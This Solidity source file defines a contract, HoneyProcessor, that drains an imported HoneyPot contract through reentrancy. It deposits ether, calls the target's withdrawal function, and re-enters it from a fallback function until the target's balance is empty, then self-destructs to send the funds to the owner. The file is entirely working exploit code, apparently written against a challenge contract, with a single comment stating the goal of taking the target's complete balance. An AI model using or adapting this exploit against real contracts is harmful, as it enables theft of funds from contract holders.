pragma solidity 0.4.24;

import "./HoneyPot.sol";

contract HoneyProcessor {
    HoneyPot honeyPot;
    address owner;
    
    function HoneyProcessor(address hp) public {
        honeyPot = HoneyPot(hp);
        owner = msg.sender;
    }
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    /* All actions required to take out complete balance from the target contract are
       performed as a single transaction.
    */
    function equip() payable public{
        require(honeyPot.balance%msg.value == 0);
        honeyPot.put.value(msg.value)();
        attack();
        destruct();
    }
    
    function attack() private {
        honeyPot.get();
    }
    
    function getContBalance() public view returns(uint) {
        return honeyPot.balance;
    }
    
    function destruct() public onlyOwner {
        selfdestruct(msg.sender);
    }
    
    function() public payable {
        if(honeyPot.balance != 0){
            honeyPot.get();
        }
        
    }
   
}

